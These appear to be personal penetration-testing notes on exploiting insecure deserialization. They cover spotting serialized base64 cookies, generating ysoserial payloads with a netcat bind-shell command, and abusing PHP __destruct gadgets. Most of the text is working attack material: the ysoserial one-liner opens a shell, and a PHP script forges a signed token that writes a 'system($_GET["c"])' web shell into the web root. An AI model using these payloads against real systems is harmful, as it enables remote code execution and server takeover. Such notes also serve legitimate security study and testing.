### When a cookie appears to be b64 - decode in burp (to get hex output) and look for nullbytes in the string, this is a good indication that the object is serialized  
 ** Once you run through the steps to generate the payload, we simply replace the serialized cookie with our payload
 
### `ysoserial` usage  
 ** Either identify exactly which library is available OR run through each payload  
 ** Base 64 encode your output, so pipe into base64 `<ysoserial and args> | base64`  
 ** `java -jar ysoserial.jar <payload type> <command>` EG `java -jar ysoserial.jar Spring1 'nc -l -p 3443 -e /bin/sh'`  
 
### Functions to look for in source code as a trampoline gadget to jump to from `unserialize` function
 ** `__wakeup`
 ** `__destruct` - works because of how the below code writes to file - we can control what goes in there:
 ```
 function __destruct() {
    \/\/ Loogging access 
    $fd = fopen($this->logfile, 'a'); 
    fwrite($fd, $_GET['action'].\":\".$this->uuid.' by '.$this->owner.\"\
\");
```
We can see the above code exploited as below, let's say we discovered an LFI that allowed us to obtain the source code used for serialization, thus allowing us to serialize the payload to be executed by `__destruct` 
```
<?php
define('KEY', "ooghie1Z Fae8aish OhT3fie6 Gae2aiza");

function sign($data) {
  return hash_hmac('md5', $data, KEY);
}
function tokenize($user) {
    $token = urlencode(base64_encode(serialize($user))); 
    $token.= "--".sign($token); 
    return $token;
}
class File {
  public $owner,$uuid, $content; //change to public $owner,$uuid='<?php system($_GET["c"]);?>';
  public $logfile = "/var/www/logs/application.log"; //change to public $logfile = "/var/www/zzz.php
}
echo tokenize(new File());
?>
```
The above spits out a token when ran which we can then send in a request to the server to be deserialized - we need to be careful that we send to the correct endpoint to ensure correct handling.
